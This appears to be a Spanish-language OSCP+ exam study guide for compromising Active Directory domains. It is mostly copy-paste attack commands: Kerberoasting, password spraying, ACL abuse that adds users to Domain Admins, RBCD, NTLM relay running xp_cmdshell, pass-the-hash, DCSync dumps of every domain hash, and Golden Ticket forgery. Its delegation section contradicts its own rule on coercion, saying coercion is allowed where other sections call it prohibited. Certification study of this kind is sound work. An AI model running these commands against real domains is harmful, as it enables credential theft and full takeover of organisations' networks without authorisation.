# 05 — Active Directory (OSCP+)

**40 de los 100 puntos.** Es la sección que más rinde y la que más gente subestima.

> **Alcance del examen**: **SÍ entran los ataques de relay NTLM** (con `ntlmrelayx`), pero:
> - la **coerción está PROHIBIDA** (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce) — no se puede
>   forzar la autenticación;
> - el **spoofing/poisoning está PROHIBIDO** → **Responder solo con `-A`** (modo análisis);
> - los **certificados (ADCS/ESC*)** quedan fuera.
> La autenticación a relayar debe venir de una **fuente no coercida** (client-side, una app que
> conecta sola…). Técnicas prohibidas (para labs): [`../cheatsheets/rpc-coercion.md`](../cheatsheets/rpc-coercion.md).
>
> Fuentes: [The Hacker Recipes — AD](https://www.thehacker.recipes/ad/) ·
> [`cheatsheets/nxc.md`](../cheatsheets/nxc.md) · [`cheatsheets/impacket.md`](../cheatsheets/impacket.md).
>
> **¿Tenés prisa?** Saltá directo a **[[#Trucos, atajos y comandos copy-paste|Trucos, atajos y comandos copy-paste]]**.

---

## Punto de partida: *assumed breach*

> "For the Active Directory exam set, learners will be provided with a username and password,
> simulating a breach scenario." — *OSCP+ Exam Guide*

**Te dan credenciales válidas.** No hay que romper el perímetro: arrancás desde adentro.

| No pierdas tiempo en | Enfocate en |
| --- | --- |
| Escanear un perímetro externo | Enumerar el dominio con credenciales ya válidas |
| Buscar la vuln de entrada | ACLs, delegación, Kerberoast, DCSync |
| Fuerza bruta inicial | Movimiento lateral y escalada en el dominio |

### Los 3 puntajes del set

| Máquina | Puntos |
| --- | --- |
| DC / máquina #1 | 10 |
| Máquina #2 | 10 |
| Máquina #3 | **20** |

**El set NO es todo o nada.** Con las dos primeras ya llevás 20 pts. **No abandones el set si te
trabás en la tercera.**

---

## Configuración previa (evita errores confusos)

```bash
# /etc/hosts y DNS
echo "<DC_IP>  <dominio> <hostname>.<dominio> <HOSTNAME>" | sudo tee -a /etc/hosts
# /etc/resolv.conf:  nameserver <DC_IP>   (o usar -ns en las herramientas)

# Reloj (Kerberos falla con >5 min de skew)
sudo ntpdate <DC_IP> 2>/dev/null || sudo rdate -n <DC_IP>
```

> Muchos ataques de Kerberos fallan **solo** por resolución de nombre o por reloj. Revisá esto
> antes de culpar al exploit.

---

## Fase 1 — Enumeración del dominio

### 1.1 Confirmar dominio, DC y política

```bash
/usr/bin/nxc smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --shares
/usr/bin/nxc smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --users
/usr/bin/nxc smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --groups
/usr/bin/nxc smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --loggedon-users
/usr/bin/nxc smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --pass-pol    # ANTES de spraying
```

```bash
# LDAP
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMINIO>' -w '<PASS>' \
  -b "DC=<dom>,DC=<local>" -s base "(objectClass=*)" defaultNamingContext
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --query "(objectClass=domain)" "*"
```

**Qué buscar**: `description`/`info`/`comment` con contraseñas pegadas, grupos sospechosos
(`Helpdesk`, `Backup Operators`, `Account Operators`), cuentas sin preautenticación, SPNs.

### 1.2 BloodHound — recolectá primero, atacá después

```bash
bloodhound-python -u '<USER>' -p '<PASS>' -d <dominio.local> -ns <DC_IP> -c all --zip
# o vía NetExec
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> \
        --bloodhound --collection All --dns-server <DC_IP>
```

Si tarda o falla la resolución: `-c Default` o `DCOnly`.

**Consultas que importan** (importá el `.zip` en BloodHound):

```text
Shortest Paths from Owned Principals        ← la más importante
Find Principals with DCSync Rights
Shortest Paths to Domain Admins
Find All Paths from Kerberoastable Users
Find Computers where Domain Users are Local Admin
```

**Regla**: marcá tu usuario como **Owned** y buscá el camino más corto a Domain Admins. Ese
camino **es** tu plan.

### 1.3 Otros datos útiles

```bash
# Trusts
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --query "(objectClass=trustedDomain)" "*"
# GPO
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMINIO>' -w '<PASS>' -b "DC=<dom>,DC=<local>" "(objectClass=groupPolicyContainer)" displayName
# Máquinas
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --computers
# Sesiones (quién está logueado dónde)
/usr/bin/nxc smb <RANGO> -u <USER> -p '<PASS>' -d <DOMINIO> --loggedon-users
```

---

## Fase 2 — Ataques de credenciales

### 2.1 AS-REP Roasting (no requiere credenciales válidas)

Contra cuentas con **preautenticación deshabilitada**.

```bash
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --asreproast asrep.txt
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip <DC_IP> '<DOMINIO>/'
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'
```

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### 2.2 Kerberoasting (requiere cuenta de dominio)

Pedís un ticket de servicio y lo crackeás **offline**. **El ataque más rentable de todo AD.**

```bash
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --kerberoasting kerb.txt
GetUserSPNs.py -outputfile kerb.txt -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'
pypykatz kerberos spnroast -d '<DOMINIO>' -t <USER> -e 23 'kerberos+password://<DOMINIO>/<USER>:<PASS>@<DC_IP>'
```

```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
```

> **Priorizá cuentas de servicio**: sus contraseñas suelen estar viejas y débilmente elegidas
> (a veces el nombre del servicio + un número).

### 2.3 Password Spraying

```bash
# PRIMERO: leer la política de bloqueo
/usr/bin/nxc smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --pass-pol

# Si el umbral es 5 o más, spraying con 3 intentos o menos
/usr/bin/nxc smb <DC_IP> -u usuarios.txt -p 'Password123!' -d <DOMINIO> --continue-on-success
kerbrute passwordspray -d <dominio.local> --dc <DC_IP> usuarios.txt 'Password123!'
```

**Reglas de oro:**
- **Nunca** `rockyou.txt` contra AD por defecto: es la forma más rápida de bloquear cuentas.
- **Primero** sembrá con contraseñas del contexto: `<Empresa>2026!`, `<Estación>2026`, `<dominio>123`.
- **Una contraseña a la vez** contra muchos usuarios.
- Registrá lo probado: repetir es lo que bloquea.

### 2.4 Crackeo

```bash
hashcat -m 18200 asrep.txt  rockyou.txt   # AS-REP
hashcat -m 13100 kerb.txt   rockyou.txt   # Kerberoast
hashcat -m 1000  ntlm.txt   rockyou.txt   # NTLM
hashcat -m 5600  netntlmv2.txt rockyou.txt
```

### 2.5 GPP (Group Policy Preferences) — `cpassword`

MS publicó la clave de cifrado; se descifra trivialmente.

```bash
Get-GPPPassword.py '<DOMINIO>/<USER>:<PASS>@<DC_HOST>'
/usr/bin/nxc smb <DC> -u <USER> -p '<PASS>' -M gpp_password
/usr/bin/nxc smb <DC> -u <USER> -p '<PASS>' -M gpp_autologin
gpp-decrypt <CPASSWORD>
```

### 2.6 LAPS — leer la contraseña del admin local

**Legacy LAPS**: `ms-Mcs-AdmPwd`. **Windows LAPS**: `msLAPS-Password` / `msLAPS-EncryptedPassword`.

```bash
pyLAPS.py --action get -d '<DOMINIO>' -u '<USER>' -p '<PASS>' --dc-ip <DC_IP>
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --module laps
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --module laps -O computer="target-*"
```

```powershell
Get-DomainComputer "MachineName" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

### 2.7 gMSA — leer la contraseña gestionada

Si tu objeto está en `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`):

```bash
gMSADumper.py -u '<USER>' -p '<PASS>' -d '<DOMINIO>'
bloodyAD --host <DC_IP> -d <DOMINIO> -u <USER> -p '<PASS>' get object <TargetObject> --attr msDS-ManagedPassword
```

```powershell
$gmsa = Get-ADServiceAccount -Identity $TARGET -Properties 'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'
(ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword').SecureCurrentPassword | ConvertTo-NTHash
```

### 2.8 Credenciales en shares y archivos

```bash
/usr/bin/nxc smb <IP> -u <USER> -p '<PASS>' --spider share --pattern "passw"
/usr/bin/nxc smb <IP> -u <USER> -p '<PASS>' --shares
# Buscar: unattend.xml, web.config, scripts, backups, GPP, .kdbx, id_rsa
```

---

## Fase 3 — Abuso de ACLs (DACL) — el corazón de la escalada

Acá está el 80% de la escalada dentro del dominio. BloodHound te marca las aristas en rojo.

> **Herramienta**: `dacledit.py` está en el PATH (symlink a Impacket). También `bloodyAD`.
> **Antes de modificar una ACL, sacá backup** (`-action backup`) y restaurá al terminar.

### 3.1 Tabla de derechos → explotación

| Derecho sobre | Efecto | Cómo se explota |
| --- | --- | --- |
| **ForceChangePassword** (user) | cambiar la contraseña | `net rpc password` / `Set-DomainUserPassword` |
| **GenericAll** (user) | control total | ForceChangePassword · targeted Kerberoast |
| **GenericAll** (group) | control total | AddMember |
| **GenericAll** (computer) | control total | RBCD · leer LAPS |
| **GenericWrite** (user) | escribir atributos | targeted Kerberoast |
| **WriteDacl** | modificar la ACL | te otorgás `GenericAll` / `DCSync` |
| **WriteOwner** | cambiar el dueño | te volvés owner → WriteDacl → GenericAll |
| **AddSelf** (group) | auto-agregarse | agregarte a un grupo privilegiado |
| **AddMember** (group) | agregar a terceros | agregar un usuario que controlás |
| **AllExtendedRights** (user) | todos los derechos extendidos | incluye ForceChangePassword |
| **ReadLAPSPassword** (computer) | leer LAPS | `pyLAPS` / `--module laps` |
| **ReadGMSAPassword** (gMSA) | leer password gMSA | `gMSADumper` |
| **DCSync** (domain) | replicar creds | `secretsdump -just-dc` |
| **WriteSPN** (user) | escribir SPN | targeted Kerberoast |
| **Logon script** (user) | script en el logon | escribir un script que correrá como el usuario |

### 3.2 ForceChangePassword

```bash
net rpc password '<TARGET_USER>' 'NuevaPass123!' -U '<DOMINIO>/<USER>%<PASS>' -S <DC_IP>
rpcclient -U '<DOMINIO>/<USER>%<PASS>' <DC_IP>
rpcclient $> setuserinfo2 <TARGET_USER> 23 'NuevaPass123!'
bloodyAD --host <DC_IP> -d <DOMINIO> -u <USER> -p '<PASS>' set password '<TARGET_USER>' 'NuevaPass123!'
```

```powershell
$p = ConvertTo-SecureString 'NuevaPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity '<TARGET_USER>' -AccountPassword $p
```

### 3.3 AddMember / AddSelf

```bash
net rpc group addmem 'Domain Admins' '<TARGET_USER>' -U '<DOMINIO>/<USER>%<PASS>' -S <DC_HOST>
bloodyAD --host <DC_IP> -d <DOMINIO> -u <USER> -p '<PASS>' add groupMember 'Domain Admins' '<TARGET_USER>'
```

```cmd
net group 'Domain Admins' <USER> /add /domain
```

```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members '<USER>'
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<USER>'   # PowerView
```

### 3.4 Grant rights (WriteDacl → GenericAll / DCSync)

```bash
# BACKUP primero
/usr/share/doc/python3-impacket/examples/dacledit.py -action backup \
  -target-dn "CN=<TARGET>,CN=Users,DC=dom,DC=local" -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# Te otorgás FullControl
dacledit.py -action write -rights FullControl -principal '<USER>' \
  -target-dn "CN=<TARGET>,CN=Users,DC=dom,DC=local" -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# O DCSync (DS-Replication-Get-Changes[-All])
dacledit.py -action write -rights DCSync -principal '<USER>' -target '<DOMINIO>' -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

bloodyAD --host <DC_IP> -d <DOMINIO> -u <USER> -p '<PASS>' add genericAll '<TargetObject>' '<ControlledPrincipal>'
bloodyAD --host <DC_IP> -d <DOMINIO> -u <USER> -p '<PASS>' add dcsync '<ControlledPrincipal>'
```

```powershell
Add-DomainObjectAcl -Rights 'All'    -TargetIdentity '<TARGET>' -PrincipalIdentity '<USER>'
Add-DomainObjectAcl -Rights 'DCSync' -TargetIdentity '<DOMINIO>' -PrincipalIdentity '<USER>'
```

### 3.5 Grant ownership

```bash
owneredit.py -action write -new-owner '<USER>' -target '<TARGET>' -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'
bloodyAD --host <DC_IP> -d <DOMINIO> -u <USER> -p '<PASS>' add owner '<TARGET>' '<USER>'
```

### 3.6 Targeted Kerberoasting

Si tenés `GenericWrite`/`GenericAll`/`WriteSPN` sobre un usuario, le ponés un SPN y lo kerberoasteás:

```bash
targetedKerberoast.py -v -d <DC_HOST> -u '<USER>' -p '<PASS>'
/usr/bin/nxc ldap <DC_HOST> -d <DOMINIO> -u '<USER>' -p '<PASS>' --kerberoasting out.txt --targeted-kerberoast '<TARGET>'
```

```powershell
Set-DomainObject -Identity '<TARGET>' -Set @{serviceprincipalname='nonexistent/BLAH'}
$u = Get-DomainUser '<TARGET>'; $u | Get-DomainSPNTicket | fl
Set-DomainObject -Identity '<TARGET>' -Clear serviceprincipalname   # ¡limpiar al terminar!
```

> **Riesgo**: modifica el objeto. Anotá el SPN original para revertirlo.

### 3.7 Logon script

Si podés escribir el atributo `scriptPath` de un usuario, ese script se ejecutará **como ese
usuario** en su próximo logon. Combinado con `WriteOwner`/`WriteDacl` sobre una cuenta
privilegiada, da ejecución en su contexto.

---

## Fase 4 — Delegación

BloodHound marca estas aristas. La coerción para *unconstrained* **entra en el examen** (ver
Fase 5b); constrained/RBCD funcionan con las credenciales del servicio.

### 4.1 Constrained Delegation

**Con protocol transition** (`Use any authentication protocol`):

```bash
getST.py -spn 'cifs/<target>' -impersonate 'Administrator' -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'
```

```powershell
Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"<DOMINIO>" /user:"<USER>" /password:"<PASS>"
```

**Sin protocol transition** ("Kerberos only"): la vía práctica es configurar **RBCD** sobre el
mismo servicio (necesitás `msDS-AllowedToActOnBehalfOfOtherIdentity`) y luego:

```bash
getST.py -spn 'cifs/serviceA' -impersonate 'Administrator' -dc-ip <DC_IP> '<DOMINIO>/<SERVICE_B>:<PASS>'
```

### 4.2 Resource-Based Constrained Delegation (RBCD)

**No requiere privilegios de dominio**: alcanza con `GenericWrite`/`GenericAll` sobre una
**cuenta de equipo** y poder crear/controlar otra cuenta de equipo.

```bash
# 1) ¿Puedo crear cuentas de equipo? (MachineAccountQuota, por defecto 10)
/usr/bin/nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -d <DOMINIO> --query "(objectClass=domain)" "ms-DS-MachineAccountQuota"

# 2) Crear la cuenta de equipo
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# 3) Escribir la RBCD en el objetivo
rbcd.py -action write -delegate-from 'FAKE$' -delegate-to '<TARGET>$' -dc-ip <DC_IP> '<DOMINIO>/<USER>:<PASS>'

# 4) S4U2Self + S4U2Proxy
getST.py -spn 'cifs/<TARGET>' -impersonate 'Administrator' -dc-ip <DC_IP> '<DOMINIO>/FAKE$:FakePass123!'

# 5) Usar el tique
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <TARGET>.<dominio>
```

### 4.3 Unconstrained Delegation

Un equipo con `TRUSTED_FOR_DELEGATION` acumula los TGT de quien se autentique. Hay que
**forzar** la autenticación (coerción) y capturar el TGT — la coerción **entra en el examen**
(ver Fase 5b):

```bash
/usr/bin/nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -d <DOMINIO> --find-delegation
findDelegation.py '<DOMINIO>/<USER>:<PASS>' -dc-ip <DC_IP>
```

---

## Fase 5b — Relay NTLM (**sí**), sin coerción ni poisoning

Relayar una autenticación NTLM hacia otro servicio. **El relay es válido**; lo que está
**prohibido** es:
- la **coerción** (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce) → **no se puede forzar** la auth;
- el **spoofing/poisoning** (Responder sin `-A`, Inveigh, mitm6) → **prohibido** por la guía.

> **Responder: solo en modo análisis (`-A`).** Sin `-A` envenena → prohibido.
> El relay a **ADCS** (ESC8) es de certificados → **fuera**. A **LDAP/LDAPS/SMB/MSSQL** sí entra.

### ¿De dónde saco la autenticación a relayar (sin coercionar)?

La víctima tiene que **conectarse a vos por sí sola**. Fuentes válidas:
- **Client-side**: un usuario abre un fichero que apunta a tu SMB/WebDAV (`config.Library-ms`,
  `.lnk`/Evil Icon, `.scf`, `.url`) → se autentica → relay.
- Una **aplicación/servicio** que resuelve una UNC que vos controlás.
- Una autenticación **pasiva** capturada en el segmento.

### Relay con ntlmrelayx

```bash
# LDAP/LDAPS → otorgar DCSync o ACLs, crear equipos, delegación
ntlmrelayx.py -t ldaps://$DC_IP --escalate-user "$USER"
ntlmrelayx.py -t ldaps://$DC_IP --add-computer 'EVIL$' --delegate-access
ntlmrelayx.py -t ldap://$DC_IP --dump-laps --dump-gmsa
# SMB → ejecutar (el relayado debe ser admin local del destino)
ntlmrelayx.py -t smb://$TARGET -c 'net localgroup administrators <USER> /add'
# MSSQL → ejecutar SQL
ntlmrelayx.py -t mssql://$TARGET -q 'EXEC xp_cmdshell "whoami"'
```

**Disparar la autenticación (client-side, NO coerción)**: entregá un `config.Library-ms` o un
`.lnk` que apunte a `\\$TU_IP\share` y esperá a que el usuario lo abra (ver
[`06-payloads-shells-transferencia.md`](06-payloads-shells-transferencia.md) §6).

### Responder en modo análisis (`-A`)

```bash
sudo responder -I tun0 -A     # solo analiza/captura, NO envenena
```

Captura hashes NTLMv2 de forma pasiva para crackear (`hashcat -m 5600`). **Sin `-A` envenena → prohibido.**

> **Caveat de red**: el relay necesita que la víctima **vuelva a vos**. A través de un SOCKS
> proxy **no funciona**: usá **ligolo-ng** (ver `07-pivoting.md`).
> Métodos de coerción (prohibidos, para labs): [`../cheatsheets/rpc-coercion.md`](../cheatsheets/rpc-coercion.md).

---

## Fase 5 — Movimiento lateral

### 5.1 Pass-the-Hash (PtH)

```bash
/usr/bin/nxc smb <IP> -u '<USER>' -H <NTHASH> -d <DOMINIO>
evil-winrm -i <IP> -u '<USER>' -H <NTHASH>
psexec.py -hashes :<NTHASH> '<DOMINIO>/<USER>@<IP>'
```

### 5.2 Pass-the-Ticket (PtT)

```bash
export KRB5CCNAME=/ruta/ticket.ccache
psexec.py -k -no-pass <host>.<dominio>
/usr/bin/nxc smb <host>.<dominio> -k --use-kcache -x whoami
```

```powershell
Rubeus.exe ptt /ticket:<base64 | file.kirbi>
klist
```

### 5.3 Overpass-the-Hash / Pass-the-Key

Cuando NTLM está deshabilitado pero Kerberos funciona: convertís un hash en un TGT.

```bash
getTGT.py -hashes :<NTHASH>   '<DOMINIO>/<USER>'@<DC_IP>
getTGT.py -aesKey <AES_KEY>   '<DOMINIO>/<USER>'@<DC_IP>     # preferí AES si hay
export KRB5CCNAME=<USER>.ccache
```

```powershell
Rubeus.exe asktgt /domain:<DOMINIO> /user:<USER> /rc4:<NTHASH> /ptt
Rubeus.exe asktgt /domain:<DOMINIO> /user:<USER> /aes256:<AES256> /ptt
```

### 5.4 Ejecución remota: qué elegir

| Método | Requisito | Nota |
| --- | --- | --- |
| **WinRM** | 5985 + `Remote Management Users` | el más limpio, shell completa |
| **WMI** | Administrador local | escribe en `ADMIN$`, no servicio |
| **PsExec** | Administrador local + `ADMIN$` | crea servicio: **más ruidoso** |
| **SMB** (`nxc -x`) | Administrador local | cómodo para comandos sueltos |
| **DCOM** | Administrador local | alternativa si SMB filtrado |

```bash
/usr/bin/nxc smb   <IP> -u user -p pass -d <DOMINIO> -x 'whoami'
/usr/bin/nxc winrm <IP> -u user -p pass -d <DOMINIO> -x 'whoami'
/usr/bin/nxc wmi   <IP> -u user -p pass -d <DOMINIO> -x 'whoami'
wmiexec.py '<DOMINIO>/<USER>:<PASS>@<IP>' 'whoami'
```

---

## Fase 6 — Compromiso total del dominio

### 6.1 DCSync

Con `DS-Replication-Get-Changes` + `-All`, le pedís al DC todos los hashes **sin tocar el disco**.

```bash
secretsdump.py -just-dc '<DOMINIO>/<USER>:<PASS>@<DC_IP>'
secretsdump.py -hashes :<NTHASH> '<DOMINIO>/<USER>'@<DC_IP> -just-dc-ntlm
```

```powershell
lsadump::dcsync /domain:<DOMINIO> /all /csv
lsadump::dcsync /domain:<DOMINIO> /user:krbtgt
```

De acá sacás: hash del `Administrator`, del `krbtgt` y de todo el dominio.

### 6.2 NTDS.dit (alternativa)

```bash
/usr/bin/nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds
# o vssadmin/diskshadow + secretsdump del .dit
```

### 6.3 Ticket del `krbtgt` → Golden Ticket

Permite **forjar tiques para cualquier usuario**. Es control total del dominio.

> **Peligro**: cambiar la contraseña del `krbtgt` **dos veces rompe el dominio**. No lo hagas.

```bash
ticketer.py -nthash <KRBTGT_NTHASH> -domain-sid <SID> -domain <dominio.local> Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <DC>.<dominio>
```

```powershell
Rubeus.exe golden /rc4:<KRBTGT_NTHASH> /domain:<DOMINIO> /sid:<SID> /user:Administrator /ptt
```

El SID del dominio:

```bash
/usr/bin/nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMINIO> --get-sid
lookupsid.py '<DOMINIO>/<USER>:<PASS>'@<DC_IP> | head
```

### 6.4 Silver Ticket

Tique de servicio forjado con la clave de una cuenta de máquina/servicio (menos alcance que un
Golden, pero sigiloso).

```bash
ticketer.py -nthash <SERVICE_NTHASH> -domain-sid <SID> -domain <dominio.local> \
            -spn cifs/<host>.<dominio> Administrator
```

### 6.5 Persistencia (conceptos, no hace falta en el examen)

| Técnica | Qué es |
| --- | --- |
| **Golden Ticket** | tique forjado con el hash del `krbtgt` |
| **SID History** | inyectar el SID de un DA en un usuario controlado (`mimikatz sid::add`) |
| **AdminSDHolder** | derivar control de cuentas protegidas vía el ACL de ese objeto |
| **Skeleton Key** | contraseña maestra en el DC (`mimikatz misc::skeleton`) |
| **DSRM** | contraseña del modo restauración para logon local en el DC |
| **DCShadow** | registrar un DC rogue y replicar cambios |
| **goldenGMSA** | forjar la contraseña de una gMSA con la clave de KDS |

> En el OSCP **no son necesarias** para marcar los flags; alcanza con documentar el compromiso.
> Ver [The Hacker Recipes — AD persistence](https://www.thehacker.recipes/ad/persistence/).

---

## Árbol de decisión

```text
┌── 1. Recolectar BloodHound (-c all) y marcar Owned
│
├── 2. Kerberoasting ────────────────► crackear ─► ¿DA? → listo
│                                      └─ ¿service account? → enumerar sus derechos
├── 3. AS-REP Roasting ──────────────► crackear ─► credenciales nuevas
├── 4. GPP / LAPS / gMSA ────────────► credenciales nuevas
│
├── 5. ACLs según BloodHound
│      ├─ ForceChangePassword ──────► cambiar pass ─► login
│      ├─ GenericWrite/WriteSPN ────► targeted Kerberoast
│      ├─ AddSelf/AddMember ────────► agregarse a grupo privilegiado
│      ├─ WriteDACL/WriteOwner ─────► escalar la ACL ─► volver a 5
│      └─ DCSync rights ────────────► DCSync
│
├── 6. Delegación
│      ├─ Constrained (con protocol transition) ─► getST -impersonate
│      └─ RBCD ─────────────────────► addcomputer + rbcd + getST
│
├── 6b. Relay (sin coerción) ────────► ntlmrelayx a LDAP/SMB/MSSQL (SÍ entra)
│
├── 7. Pass-the-Hash / Pass-the-Ticket ─► movimiento lateral
│
├── 8. DCSync ──────────────────────► krbtgt → Golden Ticket
│
└── 9. Compromiso total → dump completo → documentar
```

---

## Errores que te cuestan el set

| Error | Por qué duele |
| --- | --- |
| No correr BloodHound al principio | improvisás en vez de seguir el grafo |
| DNS/reloj mal configurados | Kerberos falla con errores confusos |
| Spraying con rockyou | bloqueás cuentas del examen |
| No hacer Kerberoasting temprano | ganancia desproporcionada por minuto invertido |
| Modificar una ACL sin backup | rompés el entorno sin poder revertir |
| Dejar un SPN/ACL modificado | ensuciás el entorno |
| Cambiar el `krbtgt` | **rompe el dominio** |
| Abandonar el set en la máquina #3 | ya tenés 20 pts cobrados |
| Perseguir el DC antes de cobrar puntos parciales | asegurá puntos primero |

---

## Trucos, atajos y comandos copy-paste

> Todo dentro del **alcance del examen**. El **relay sí entra**; los **certificados no**.

### 0. Pegá esto al empezar (evita typos)

```bash
export DOMAIN='dominio.local'          # minúsculas, para la mayoría de tools
export REALM='DOMINIO.LOCAL'           # mayúsculas, para Kerberos
export DC_IP='10.10.10.10'
export USER='usuario'
export PASS='password'
export DC_HOST="dc.$DOMAIN"

# /etc/hosts + DNS + reloj (una vez)
echo "$DC_IP  $DOMAIN $DC_HOST" | sudo tee -a /etc/hosts
sudo ntpdate "$DC_IP" 2>/dev/null || sudo rdate -n "$DC_IP"
```

### 1. Recon en pocos comandos

```bash
# Todo lo útil del DC de una pasada
nxc smb  "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" \
  --shares --users --groups --computers --pass-pol --loggedon-users

# ¿Dónde tengo admin local / dónde funciona esta credencial? (todo un rango)
nxc smb   10.10.10.0/24 -u "$USER" -p "$PASS" -d "$DOMAIN" --continue-on-success
nxc winrm 10.10.10.0/24 -u "$USER" -p "$PASS" -d "$DOMAIN" --continue-on-success
# Probar el hash donde no haya password
nxc smb   10.10.10.0/24 -u "$USER" -H "$NTHASH" -d "$DOMAIN" --continue-on-success

# ¿Dónde está logueado un admin? (para luego PtH/PtT)
nxc smb 10.10.10.0/24 -u "$USER" -p "$PASS" -d "$DOMAIN" --loggedon-users
```

Salida a fichero para no perderla:

```bash
mkdir -p ~/examen/evidencia/ad && nxc smb "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" \
  --shares --users --groups 2>&1 | tee ~/examen/evidencia/ad/enum.txt
```

### 2. Consultas LDAP listas (nxc ldap)

```bash
# Contraseñas pegadas en description/info/comment
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --query "(description=*)" "sAMAccountName description"
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --query "(info=*)" "sAMAccountName info"

# Cuentas sin preautenticación (AS-REP) y con SPN (Kerberoast)
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --password-not-required
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --admin-count
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --gmsa

# Delegación
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --find-delegation
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --trusted-for-delegation

# SID del dominio (para Golden) y política de contraseñas
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --get-sid
nxc smb  "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --pass-pol
```

`ldapsearch` para lo que nxc no cubre:

```bash
ldapsearch -x -H ldap://"$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" "(objectClass=user)" \
  sAMAccountName memberOf description servicePrincipalName
```

### 3. BloodHound: recolectar y analizar

```bash
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" -c all --zip
# o
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --bloodhound --collection All --dns-server "$DC_IP"
```

Consultas (builtin más las custom). Reemplazá `DOMAIN.LOCAL` por tu **REALM** en mayúsculas:

```cypher
// Camino más corto desde Owned a Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

// Usuarios kerberoastables (con SPN) que no son de máquina
MATCH (u:User {hasspn:true}) WHERE NOT u.hasspn=false AND u.enabled=true RETURN u.name, u.serviceprincipalnames

// Quién tiene DCSync
MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p

// Sesiones de admins (dónde atacar con PtH/PtT)
MATCH (u:User {admincount:true})-[r:HasSession]->(c:Computer) RETURN u.name, c.name

// Máquinas donde Domain Users es admin local
MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:AdminTo]->(c:Computer) RETURN p
```

### 4. Desde un host Windows (foothold en el set)

```powershell
# Enum rápida con PowerView
. .\PowerView.ps1
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired | select samaccountname
Get-DomainUser -AdminCount | select samaccountname
Get-DomainUser -TrustedToAuth | select samaccountname
Get-DomainComputer -TrustedToAuth | select name
Get-DomainObjectAcl -ResolveGUIDs -Identity "<target>"
Find-LocalAdminAccess
Invoke-UserHunter -Stealth

# Kerberoast / AS-REP desde Windows
.\Rubeus.exe kerberoast /outfile:kerb.txt
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
